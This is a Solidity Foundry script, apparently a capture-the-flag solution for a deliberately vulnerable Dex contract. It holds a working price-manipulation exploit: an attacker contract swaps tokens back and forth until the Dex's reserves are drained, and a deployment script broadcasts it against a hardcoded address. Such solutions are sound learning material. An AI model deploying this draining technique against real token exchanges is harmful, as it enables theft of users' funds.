// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Dex.sol";
import "forge-std/Script.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract AttackDex {
    Dex public dex;
    address public token1;
    address public token2;

    constructor(Dex _dex) {
        dex = _dex;
        token1 = dex.token1();
        token2 = dex.token2();
    }

    function attack() public {
        while (
            IERC20(token1).balanceOf(address(dex)) > 0 &&
            IERC20(token2).balanceOf(address(dex)) > 0
        ) {
            if (
                IERC20(token1).balanceOf(address(this)) >
                IERC20(token2).balanceOf(address(this))
            ) {
                _swap(token1, token2);
            } else {
                _swap(token2, token1);
            }
        }
    }

    function _swap(address from, address to) internal {
        uint256 amount = IERC20(from).balanceOf(address(this));
        uint256 dexToBalance = IERC20(to).balanceOf(address(dex));

        // calculate expected output
        uint256 swapAmount = dex.getSwapPrice(from, to, amount);

        // 🔥 FINAL TRICK: adjust amount if it would over-drain
        if (swapAmount > dexToBalance) {
            uint256 dexFromBalance = IERC20(from).balanceOf(address(dex));

            // solve: (amount * dexTo) / dexFrom = dexTo
            amount = dexFromBalance;
        }

        IERC20(from).approve(address(dex), amount);
        dex.swap(from, to, amount);
    }
}

contract DexSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Dex dexInstance = Dex(0x50C677101906d05bD64e0e8b923B93dBDAfC64D3);
        AttackDex attacker = new AttackDex(dexInstance);

        // ⚠️ Make sure attacker contract already holds initial tokens
        attacker.attack();

        vm.stopBroadcast();
    }
}